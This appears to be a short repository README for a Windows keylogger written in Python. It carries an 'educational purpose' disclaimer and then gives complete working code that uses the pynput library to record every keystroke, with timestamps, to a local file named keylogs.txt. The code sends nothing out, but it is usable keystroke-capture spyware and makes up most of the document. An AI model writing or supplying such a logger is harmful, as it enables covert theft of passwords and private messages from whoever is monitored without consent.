# Python-keylogger
This the Keylogger made with the python programming language. Please use this script wisely, this is only for educational purpose and if any harmful activity happen i am the one how is responsible                                                                  






KEYLOGGER FOR WINDOWS USING PYTHON
------------------------------------------------

CODE:

from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
